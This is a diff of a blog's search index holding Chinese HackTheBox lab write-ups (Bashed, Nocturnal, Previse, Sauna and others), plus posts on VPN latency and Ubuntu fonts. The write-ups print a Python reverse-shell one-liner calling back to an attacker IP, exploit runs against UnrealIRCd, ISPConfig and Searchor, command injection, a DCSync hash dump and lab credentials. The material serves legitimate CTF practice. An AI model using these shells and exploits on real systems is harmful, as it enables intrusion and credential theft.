@@ -2,38 +2,56 @@
 <search>
   <entry>
     <title>HackTheBox-网络延迟优化</title>
-    <url>/Hackthebox/htb/hackthebox/</url>
-    <content><![CDATA[<p><img src="/image-20250411140726536.png"></p>
+    <url>/posts/2450b230.html</url>
+    <content><![CDATA[<img src="/posts/2450b230/image-20250411140726536.png" class="">
+
 <span id="more"></span>
 
-<h3 id="1-优化结果"><a href="#1-优化结果" class="headerlink" title="1. 优化结果"></a>1. 优化结果</h3><h4 id="网络优化前"><a href="#网络优化前" class="headerlink" title="网络优化前"></a>网络优化前</h4><p><img src="/image-20250410225239612.png" alt="延迟"></p>
-<h4 id="网络优化后"><a href="#网络优化后" class="headerlink" title="网络优化后"></a>网络优化后</h4><p><img src="/image-20250410230011943.png" alt="延迟"></p>
+<h3 id="1-优化结果"><a href="#1-优化结果" class="headerlink" title="1. 优化结果"></a>1. 优化结果</h3><h4 id="网络优化前"><a href="#网络优化前" class="headerlink" title="网络优化前"></a>网络优化前</h4><img src="/posts/2450b230/image-20250410225239612.png" class="" title="延迟">
+
+<h4 id="网络优化后"><a href="#网络优化后" class="headerlink" title="网络优化后"></a>网络优化后</h4><p><img src="/./hackthebox/image-20250410230011943.png" alt="延迟"></p>
 <h3 id="2-操作步骤"><a href="#2-操作步骤" class="headerlink" title="2. 操作步骤"></a>2. 操作步骤</h3><h4 id="1-选择节点"><a href="#1-选择节点" class="headerlink" title="1.选择节点"></a>1.选择节点</h4><p>最好选择新加坡节点并且选择TCP 443</p>
-<p><img src="/image-20250410230624757.png" alt="OpenVPN节点"></p>
+<img src="/posts/2450b230/image-20250410230624757.png" class="" title="OpenVPN节点">
+
 <h4 id="2-配置VPN文件"><a href="#2-配置VPN文件" class="headerlink" title="2. 配置VPN文件"></a>2. 配置VPN文件</h4><p>打开下载的VPN配置文件，可以看到远程地址为hackthebox.eu，在配置文件中添加代理，使OpenVPN 通过代理接入hackthebox</p>
 <p>http代理：http-proxy  ip port</p>
 <p>socks5 代理：socks-proxy ip port </p>
-<p><img src="/image-20250410234918886.png" alt="OpenVPN配置"></p>
+<img src="/posts/2450b230/image-20250410234918886.png" class="" title="OpenVPN配置">
+
 <h4 id="3-代理配置"><a href="#3-代理配置" class="headerlink" title="3.代理配置"></a>3.代理配置</h4><h5 id="Shadowrocket"><a href="#Shadowrocket" class="headerlink" title="Shadowrocket"></a>Shadowrocket</h5><p>节点最好启用新加坡节点和hackthebox保持一致，确保全局路由为配置，后面会修改配置文件</p>
-<p><img src="/image-20250410231454084.png" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/image-20250410231454084.png" class="" title="shadowrocket配置">
+
 <p>编辑已经启用的配置文件</p>
-<p><img src="/8bc936b78cd0d13f554c9222008a49c1.jpg" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/8bc936b78cd0d13f554c9222008a49c1.jpg" class="" title="shadowrocket配置">
+
 <p>选中规则并添加</p>
-<p><img src="/cb12c060679dc74320061baa709f7a34.jpg" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/cb12c060679dc74320061baa709f7a34.jpg" class="" title="shadowrocket配置">
+
 <p>类型选择<code>DOMAIN-KEYWORD</code> 策略选择<code>PROXY</code> 域名填写 hackthebox 这个就是OpenVPN配置文件中那个域名，如果是使用pwnbox的话，可以把<code>htb</code> 添加到域名那栏</p>
-<p><img src="/227a91d96734bec314c24413838c530f.jpg" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/227a91d96734bec314c24413838c530f.jpg" class="" title="shadowrocket配置">
+
 <p>注意保存，确保规则有效</p>
-<p><img src="/43ad2ecee9d2edc8fa497daf420769fd.jpg" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/43ad2ecee9d2edc8fa497daf420769fd.jpg" class="" title="shadowrocket配置">
+
 <p>打开代理共享，并将地址配置到OpenVPN配置文件中</p>
-<p><img src="/1e6f487557bb177f8be2a20e335b4ade.jpg" alt="shadowrocket配置"></p>
+<img src="/posts/2450b230/1e6f487557bb177f8be2a20e335b4ade.jpg" class="" title="shadowrocket配置">
+
 <h5 id="Clash"><a href="#Clash" class="headerlink" title="Clash"></a>Clash</h5><p>在Clash设置中启用<code>虚拟网卡模式</code>  端口设置中打开<code>SOCKS代理端口</code>  </p>
-<p><img src="/image-20250410232456699.png" alt="clash配置"></p>
+<img src="/posts/2450b230/image-20250410232456699.png" class="" title="clash配置">
+
 <p>打开订阅，右键<code>订阅文件</code>点击<code>编辑规则</code></p>
-<p><img src="/image-20250410234047925.png" alt="clash配置"></p>
+<img src="/posts/2450b230/image-20250410234047925.png" class="" title="clash配置">
+
 <p>在编辑规则中 ：规则类型选择<code>DOMAIN-KEYWORD</code> ，代理策略选择代理组，规则内容填写 hackthebox</p>
-<p><img src="/image-20250410234207924.png" alt="clash配置"></p>
+<img src="/posts/2450b230/image-20250410234207924.png" class="" title="clash配置">
+
 <p>代理组的选择取决于订阅，节点依旧选择同地区，注意更新订阅可能会覆盖自定义规则</p>
-<p><img src="/image-20250410234325521.png" alt="clash配置"></p>
+<img src="/posts/2450b230/image-20250410234325521.png" class="" title="clash配置">
+
+
+
+
+
 ]]></content>
       <categories>
         <category>Hackthebox</category>
@@ -44,8 +62,8 @@
   </entry>
   <entry>
     <title>HTB-Bashed</title>
-    <url>/Hackthebox/htb/htb-Bashed/</url>
-    <content><![CDATA[<style>.iidzvstqlsrs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Bashed/0f058b73659ca043de9f5240abd651ca.png" class="iidzvstqlsrs" alt="Bashed">
+    <url>/posts/f52f847.html</url>
+    <content><![CDATA[<style>.yyunyyyziqqg{zoom:50%;}</style><img src="/posts/f52f847/0f058b73659ca043de9f5240abd651ca.png" class="yyunyyyziqqg" alt="Bashed">
 
 <span id="more"></span>
 
@@ -75,7 +93,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">237.89</span> seconds</code></pre>
 
 <p>访问80端口，存在站点</p>
-<p><img src="/image-20250421235102449.png" alt="phpbash"></p>
+<img src="/posts/f52f847/image-20250421235102449.png" class="" title="phpbash">
+
 <h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf猜解目录，找到dev目录</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://10.10.10.68/FUZZ'</span>  <span class="token parameter variable">-ic</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> 
 
@@ -111,9 +130,11 @@ fonts                   <span class="token punctuation">[</span>Status: <span cl
 server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">299</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 116ms<span class="token punctuation">]</span></code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问dev目录，点击phpbash.php，发现控制台</p>
-<p><img src="/image-20250421230255079.png" alt="image-20250421230255079"></p>
+<img src="/posts/f52f847/image-20250421230255079.png" class="" title="image-20250421230255079">
+
 <p>可以成功执行命令，利用控制台反弹shell</p>
-<p><img src="/image-20250421235020611.png" alt="image-20250421235020611"></p>
+<img src="/posts/f52f847/image-20250421235020611.png" class="" title="image-20250421235020611">
+
 <pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.33",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></code></pre>
 
 <p>成功接收到shell</p>
@@ -191,8 +212,8 @@ root@bashed:/scripts<span class="token comment"># id       </span>
   </entry>
   <entry>
     <title>HTB-Irked</title>
-    <url>/Hackthebox/htb/htb-Irked/</url>
-    <content><![CDATA[<style>.jxujtxqlyxom{zoom:50%;}</style><img src="/Hackthebox/htb/htb-Irked/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="jxujtxqlyxom">
+    <url>/posts/b88b7678.html</url>
+    <content><![CDATA[<style>.zxqpqojtnclq{zoom:50%;}</style><img src="/posts/b88b7678/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="zxqpqojtnclq">
 
 <span id="more"></span>
 
@@ -246,9 +267,11 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 </code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用 irc 客户端(hexchat和irssi都可以)访问6697 端口，可以看到连接信息中返回的“Unreal3.2.8.1”</p>
-<p><img src="/image-20250419231152208.png" alt="irc"></p>
+<img src="/posts/b88b7678/image-20250419231152208.png" class="" title="irc">
+
 <p>通过检索，找到exp，修改脚本并执行</p>
-<p><img src="/image-20250420005219142.png" alt="github"></p>
+<img src="/posts/b88b7678/image-20250420005219142.png" class="" title="github">
+
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py <span class="token number">10.10</span>.10.117 <span class="token number">6697</span>  <span class="token parameter variable">-payload</span> python</code></pre>
 
 <p>成功接收到shell</p>
@@ -335,7 +358,8 @@ Super elite steg backup pw
 UPupDOWNdownLRlrBAbaSSss</code></pre>
 
 <p>访问80端口可以看到，感觉可能是什么隐写术，保存图片并使用steghide提取信息，密码使用<code>.backup</code> 中获取的密码</p>
-<p><img src="/image-20250420002023056.png" alt="web"></p>
+<img src="/posts/b88b7678/image-20250420002023056.png" class="" title="web">
+
 <p>提取出pass.txt， 使用ssh登录成功</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ steghide extract <span class="token parameter variable">-sf</span> irked.jpg 
 Enter passphrase: 
@@ -382,8 +406,8 @@ djmardov@irked:~$ <span class="token function">id</span>
   </entry>
   <entry>
     <title>HTB-Nocturnal</title>
-    <url>/Hackthebox/htb/htb-nocturnal/</url>
-    <content><![CDATA[<style>.cgzkkltlrnbc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-nocturnal/f6a56cec6e9826b4ed124fb4155abc66.png" class="cgzkkltlrnbc">
+    <url>/posts/5cd9a843.html</url>
+    <content><![CDATA[<style>.qbxqmsybewpq{zoom:50%;}</style><img src="/posts/5cd9a843/f6a56cec6e9826b4ed124fb4155abc66.png" class="qbxqmsybewpq">
 
 <span id="more"></span>
 
@@ -421,9 +445,11 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.64 nocturnal.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
 
 <h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>访问应用，可以自行注册用户</p>
-<p><img src="/image-20250419153519866.png" alt="注册"></p>
+<img src="/posts/5cd9a843/image-20250419153519866.png" class="" title="注册">
+
 <p>登录后有个上传功能，只支持pdf、doc、docx、xls、xlsx、odt，上传文件后查看文件url为<code>http://nocturnal.htb/view.php?username=admin123&amp;file=shell.php.pdf</code></p>
-<p><img src="/image-20250419154125531.png" alt="文件上传"></p>
+<img src="/posts/5cd9a843/image-20250419154125531.png" class="" title="文件上传">
+
 <h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf Fuzzing 用户名</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Usernames/Names/names.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://nocturnal.htb/view.php?username=FUZZ&amp;file=shell.php.pdf'</span> <span class="token parameter variable">-H</span> <span class="token string">'Cookie: PHPSESSID=dldt7f2eqv1ia7j3dieiq69icu'</span>  <span class="token parameter variable">-fs</span> <span class="token number">2985</span> 
 
@@ -457,13 +483,17 @@ tobias                  <span class="token punctuation">[</span>Status: <span cl
 </code></pre>
 
 <h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>访问fuzz出的用户名，在amanda账户下可以看到privacy.odt</p>
-<p><img src="/image-20250419161728361.png" alt="越权"></p>
+<img src="/posts/5cd9a843/image-20250419161728361.png" class="" title="越权">
+
 <p>下载并使用LibreOffice 打开可以找到密码</p>
-<p><img src="/image-20250419161912039.png" alt="odt"></p>
+<img src="/posts/5cd9a843/image-20250419161912039.png" class="" title="odt">
+
 <p>使用amanda 登录，可以跳转到admin pannel，有备份功能</p>
-<p><img src="/image-20250419162240539.png" alt="管理页面"></p>
+<img src="/posts/5cd9a843/image-20250419162240539.png" class="" title="管理页面">
+
 <p>下载备份文件</p>
-<p><img src="/image-20250419162632127.png" alt="备份"></p>
+<img src="/posts/5cd9a843/image-20250419162632127.png" class="" title="备份">
+
 <h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在admin.php中创建备份设置密码参数直接拼接进命令中，所以存在命令注入</p>
 <pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;...&gt;
 &lt;?php
@@ -491,11 +521,14 @@ if (isset($_POST[&#39;backup&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;]
 &lt;...&gt;</code></pre>
 
 <h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>可以看到执行id命令成功</p>
-<p><img src="/image-20250419170350593.png" alt="burp"></p>
+<img src="/posts/5cd9a843/image-20250419170350593.png" class="" title="burp">
+
 <p>下载反弹shell的脚本</p>
-<p><img src="/image-20250419211424366.png" alt="burp"></p>
+<img src="/posts/5cd9a843/image-20250419211424366.png" class="" title="burp">
+
 <p>执行脚本</p>
-<p><img src="/image-20250419211229272.png" alt="burp"></p>
+<img src="/posts/5cd9a843/image-20250419211229272.png" class="" title="burp">
+
 <p>成功接收到shell</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>                          
 Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
@@ -613,12 +646,20 @@ tcp             LISTEN           <span class="token number">0</span>            
 
 <p>使用ssh 进行本地端口转发<code>ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080</code></p>
 <p>访问本地8081端口，可以看到ispconfig</p>
-<p><img src="/image-20250419214933108.png" alt="ispconfig"></p>
+<img src="/posts/5cd9a843/image-20250419214933108.png" class="" title="ispconfig">
+
 <p>使用admin和破解出的密码的登录，登录成功，找到版本号为3.2.10p1</p>
-<p><img src="/image-20250419215703693.png" alt="ispconfig"></p>
+<img src="/posts/5cd9a843/image-20250419215703693.png" class="" title="ispconfig">
+
 <p>搜索exp，找到CVE-2023-46818，在github检索利用脚本</p>
-<p><img src="/image-20250419220423834.png" alt="exp"></p>
-<p><img src="/image-20250419220537140.png" alt="github"></p>
+<img src="/posts/5cd9a843/image-20250419220423834.png" class="" title="exp">
+
+
+
+<img src="/posts/5cd9a843/image-20250419220537140.png" class="" title="github">
+
+
+
 <p>提权成功</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py http://127.0.0.1:8081 admin slowmotionapocalypse
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target URL: http://127.0.0.1:8081/
@@ -660,7 +701,7 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   </entry>
   <entry>
     <title>Ubuntu 24.04 应用、字体及截图模糊解决方案</title>
-    <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%962/</url>
+    <url>/posts/4e8c8a3d.html</url>
     <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>Ubuntu 24.04 默认使用Wayland 作为窗口管理器，当 GNOME 桌面设置分数倍缩放后，截图和一些应用会变得模糊，如vscode、Pycharm、typra ，截图更是难崩</p>
 <span id="more"></span>
 
@@ -698,8 +739,9 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   </entry>
   <entry>
     <title>Ubuntu 24.04 中文字体渲染</title>
-    <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/</url>
-    <content><![CDATA[<p><img src="/image-20250416104913620.png"></p>
+    <url>/posts/45016815.html</url>
+    <content><![CDATA[<img src="/posts/45016815/image-20250416104913620.png" class="">
+
 <span id="more"></span>
 
 <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>近期入手了一台2.8k屏幕的新本，安装了ubuntu24.04 在系统语言默认为英文时，中文字体看着非常别扭，有些字体甚至出现半格情况，比如<code>复</code> ，查了一些资料原因是字体显示优先级的问题，解决方案修改字体优先级即可</p>
@@ -774,7 +816,7 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
 &lt;&#x2F;fontconfig&gt;</code></pre>
 
 <p>效果</p>
-<p><img src="/image-20250416133422397.png" alt="image-20250416133422397"></p>
+<img src="/posts/45016815/image-20250416133422397.png" class="" title="image-20250416133422397">
 ]]></content>
       <categories>
         <category>OS优化</category>
@@ -785,8 +827,8 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   </entry>
   <entry>
     <title>HTB-Previse</title>
-    <url>/Hackthebox/htb/htb-previse/</url>
-    <content><![CDATA[<style>.miotuathqiyv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="miotuathqiyv">
+    <url>/posts/21913e3f.html</url>
+    <content><![CDATA[<style>.tyfcaqqlwmkc{zoom:50%;}</style><img src="/posts/21913e3f/e3c542ada4b134e29e534e3081ef9650.png" class="tyfcaqqlwmkc">
 
 <span id="more"></span>
 
@@ -827,21 +869,30 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">81.53</span> seconds</code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问80端口找到一个登录页面</p>
-<p><img src="/image-20250404152518515.png" alt="登录页面"></p>
+<img src="/posts/21913e3f/image-20250404152518515.png" class="" title="登录页面">
+
 <p>使用burp 抓包查看站点目录，找到一个accounts.php</p>
-<p><img src="/image-20250404152429829.png" alt="burp"></p>
+<img src="/posts/21913e3f/image-20250404152429829.png" class="" title="burp">
+
 <p>访问这个accounts.php，发现跳转不过去，可以尝试修改响应包 <code>Location：login.php</code> ，之后跳转到 accounts.php </p>
-<p><img src="/image-20250404152719306.png" alt="burp"></p>
-<p><img src="/image-20250404141506785.png" alt="add new account"></p>
+<img src="/posts/21913e3f/image-20250404152719306.png" class="" title="burp">
+
+<img src="/posts/21913e3f/image-20250404141506785.png" class="" title="add new account">
+
 <p>添加一个新账号，然后登录可以找到站点备份的压缩包</p>
-<p><img src="/image-20250404142341145.png" alt="登录"></p>
+<img src="/posts/21913e3f/image-20250404142341145.png" class="" title="登录">
+
 <p>下载并解压在config.php中可以找到mysql的用户名和密码</p>
-<p><img src="/image-20250404142515834.png" alt="压缩包"></p>
-<p><img src="/image-20250404142709658.png" alt="数据库配置"></p>
+<img src="/posts/21913e3f/image-20250404142515834.png" class="" title="压缩包">
+
+<img src="/posts/21913e3f/image-20250404142709658.png" class="" title="数据库配置">
+
 <p>分析其他php文件，在logs.php 中exec方法中引用了POST全局变量</p>
-<p><img src="/image-20250404142630382.png" alt="logs.php"></p>
+<img src="/posts/21913e3f/image-20250404142630382.png" class="" title="logs.php">
+
 <p>根据格式直接构造反弹shell，最好使用url 编码</p>
-<p><img src="/image-20250404143853371.png" alt="反弹shell"></p>
+<img src="/posts/21913e3f/image-20250404143853371.png" class="" title="反弹shell">
+
 <p>成功反弹shell</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9001</span>                                     
 listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
@@ -1004,8 +1055,8 @@ root@previse:/tmp<span class="token comment"># id      </span>
   </entry>
   <entry>
     <title>HTB-Busqueda</title>
-    <url>/Hackthebox/htb/htb-busqueda/</url>
-    <content><![CDATA[<style>.xgtfvfvuuyty{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="xgtfvfvuuyty">
+    <url>/posts/d91931aa.html</url>
+    <content><![CDATA[<style>.efgvfgbrxlri{zoom:50%;}</style><img src="/posts/d91931aa/a6942ab57b6a79f71240420442027334.png" class="efgvfgbrxlri">
 
 <span id="more"></span>
 
@@ -1045,9 +1096,11 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.208  searcher.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
 
 <p>抓包触发报错，在报错信息种可以找到版本号</p>
-<p><img src="/image-20250323111357967.png" alt="burp"></p>
+<img src="/posts/d91931aa/image-20250323111357967.png" class="" title="burp">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过找到的版本号检索漏洞</p>
-<p><img src="/image-20250324112347626.png" alt="exp"></p>
+<img src="/posts/d91931aa/image-20250324112347626.png" class="" title="exp">
+
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ ./exploit.sh searcher.htb <span class="token number">10.10</span>.16.39 <span class="token number">9001</span>  
 ---<span class="token punctuation">[</span>Reverse Shell Exploit <span class="token keyword">for</span> Searchor <span class="token operator">&lt;=</span> <span class="token number">2.4</span>.2 <span class="token punctuation">(</span><span class="token number">2.4</span>.0<span class="token punctuation">)</span><span class="token punctuation">]</span>---
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Input target is searcher.htb
@@ -1145,7 +1198,8 @@ Usage: &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py &lt;action&gt; (arg1) (arg2
 &lt;...&gt;</code></pre>
 
 <p>先使用cody 登录gitea 可以找到另一个用户是administrator，使用找到的密码登录gitea  administrator：yuiu1hoiu4i5ho1uh</p>
-<p><img src="/image-20250323132554909.png" alt="code review"></p>
+<img src="/posts/d91931aa/image-20250323132554909.png" class="" title="code review">
+
 <p>分析代码·<code> arg_list = [&#39;./full-checkup.sh&#39;]</code>  使用的是相对路径</p>
 <pre class="language-Python" data-language="Python"><code class="language-Python">#!&#x2F;bin&#x2F;bash
 import subprocess
@@ -1262,8 +1316,8 @@ connect to <span class="token punctuation">[</span><span class="token number">10
   </entry>
   <entry>
     <title>HTB-Sauna</title>
-    <url>/Hackthebox/htb/htb-sauna/</url>
-    <content><![CDATA[<style>.ubieylfhfyzt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="ubieylfhfyzt">
+    <url>/posts/5551a214.html</url>
+    <content><![CDATA[<style>.qhgomzglbebo{zoom:50%;}</style><img src="/posts/5551a214/f31d5d0264fadc267e7f38a9d7729d14.png" class="qhgomzglbebo">
 
 <span id="more"></span>
 
@@ -1327,7 +1381,10 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 </code></pre>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问80端口发现一个网站，在&#x2F;about 上可以看到一些用户名</p>
-<p><img src="/image-20250322153810191.png" alt="用户名收集"></p>
+<img src="/posts/5551a214/image-20250322153810191.png" class="" title="用户名收集">
+
+
+
 <p>收集页面上的用户名</p>
 <pre class="language-none"><code class="language-none">Fergus Smith
 Shaun Coins
@@ -1463,7 +1520,8 @@ INFO: Done <span class="token keyword">in</span> 00M 36S
 INFO: Compressing output into 20250322171023_bloodhound.zip
 </code></pre>
 
-<p><img src="/image-20250322171839977.png" alt="Bloodhound"></p>
+<img src="/posts/5551a214/image-20250322171839977.png" class="" title="Bloodhound">
+
 <h3 id="DCsync-attack"><a href="#DCsync-attack" class="headerlink" title="DCsync attack"></a>DCsync attack</h3><p>使用impacket-secretsdump 进行DCSync attack </p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-secretsdump  <span class="token string">'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175'</span>  -just-dc-user Administrator 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1524,8 +1582,8 @@ nt authority<span class="token punctuation">\</span>system
   </entry>
   <entry>
     <title>HTB-Heist</title>
-    <url>/Hackthebox/htb/htb-heist/</url>
-    <content><![CDATA[<style>.zpvvbgsqxmwp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="zpvvbgsqxmwp">
+    <url>/posts/4a8e4133.html</url>
+    <content><![CDATA[<style>.cwcdnnhgicjd{zoom:50%;}</style><img src="/posts/4a8e4133/131dbaba68b169bd5ff59ac09420b09f.png" class="cwcdnnhgicjd">
 
 <span id="more"></span>
 
@@ -1582,9 +1640,11 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.149  heist.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
 
 <p>访问80 端口，点击guest登录</p>
-<p><img src="/image-20250322122035954.png" alt="登录"></p>
+<img src="/posts/4a8e4133/image-20250322122035954.png" class="" title="登录">
+
 <p>点击Attachment，跳转到<code>http://heist.htb/attachments/config.txt</code></p>
-<p><img src="/image-20250322121508924.png" alt="config.txt"></p>
+<img src="/posts/4a8e4133/image-20250322121508924.png" class="" title="config.txt">
+
 <p>可以获取到用户名和密码hash</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">version 12.2
 no service pad
@@ -1818,8 +1878,8 @@ Mode                LastWriteTime         Length Name
   </entry>
   <entry>
     <title>HTB-Toolbox</title>
-    <url>/Hackthebox/htb/htb-toolbox/</url>
-    <content><![CDATA[<style>.joyeecrfcfpp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="joyeecrfcfpp">
+    <url>/posts/96a67a56.html</url>
+    <content><![CDATA[<style>.xwyuieodthwk{zoom:50%;}</style><img src="/posts/96a67a56/9d218e64149bfb00a002d94868f2e4b1.png" class="xwyuieodthwk">
 
 <span id="more"></span>
 
@@ -1921,7 +1981,8 @@ local: docker-toolbox.exe remote: docker-toolbox.exe
 </code></pre>
 
 <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问<code>admin.megalogistic.com</code>，使用burp 抓取登录数据，使用sqlmap测试，存在sql注入</p>
-<p><img src="/image-20250322104959280.png" alt="登录"></p>
+<img src="/posts/96a67a56/image-20250322104959280.png" class="" title="登录">
+
 <pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">admin.megalogistic.com</span></span>
 <span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=21c7525f49e68a4f7653422a03ddecfe</span></span>
@@ -2166,8 +2227,8 @@ administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class
   </entry>
   <entry>
     <title>HTB-Mirai</title>
-    <url>/Hackthebox/htb/htb-mirai/</url>
-    <content><![CDATA[<style>.lyyfluhqieek{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="lyyfluhqieek">
+    <url>/posts/c3392160.html</url>
+    <content><![CDATA[<style>.suojdzlqhdyj{zoom:50%;}</style><img src="/posts/c3392160/4ef1ea77e69185063d4200d7d0142baa.png" class="suojdzlqhdyj">
 
 <span id="more"></span>
 
@@ -2219,8 +2280,10 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.48 mirai.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
 <p>访问目标 <span class="exturl" data-url="aHR0cDovL21pcmFpLmh0Yi8=">http://mirai.htb<i class="fa fa-external-link-alt"></i></span> ,右键查看源码，找到一个路径</p>
-<p><img src="/image-20250302122107403.png" alt="源码">访问&#x2F;admin 可以看到是树苺派</p>
-<p><img src="/image-20250302122612935.png" alt="面板"></p>
+<img src="/posts/c3392160/image-20250302122107403.png" class="" title="源码">访问/admin 可以看到是树苺派
+
+<img src="/posts/c3392160/image-20250302122612935.png" class="" title="面板">
+
